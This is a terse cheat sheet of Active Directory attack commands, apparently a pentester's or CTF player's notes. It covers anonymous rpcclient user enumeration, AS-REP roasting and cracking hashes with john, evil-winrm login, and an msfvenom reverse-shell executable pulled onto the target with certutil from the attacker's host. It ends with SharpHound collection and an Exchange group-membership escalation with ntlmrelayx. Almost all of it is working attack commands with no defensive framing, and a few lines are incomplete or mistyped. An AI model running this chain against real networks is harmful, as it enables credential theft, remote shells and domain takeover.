##### enumerate users with rpcclient
```
rpcclient -U "" -N $IP
enumdomusers
```

##### AS-REP Roasting - attack against Kerberos for user accounts that do not require pre-authentication - dehash findings
```
GetNPUsers.py domain/ users.txt -format john -dc-ip $IP
john hash w=/usr/share/wordlists/rockyou.txt

```
##### connect using cracked hash
```
evil-winrm -i $IP -u username -p password
```

##### Create shell and connect with nc
```
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=$IP LPORT=443 -f exe > shell.exe
certutil -urlcache -split -f http://$IP/shell.exe

```
 

##### Bloodhound
```
# download sharphound.ps1
https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors
https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1

# Transfer to shell
certutil -urlcache -split -f http://

Import-Module ./SharpHound.ps1
Invoke-Bloodhound -CollectionMethod All -Domain my.local -LDAPUser username -LDAPPass password
```

##### Find shortest route to admin - Exchange Server
```
Import-Module ./Powerview.ps1
Add-ADGroupMember -Identity "Exchange Trusted Subsystem" -Members svc-account-hacked

sudo python3 ntlmrelayx.py -t ldap://$IP --escalate-user svc-account-hacked



                                           
```







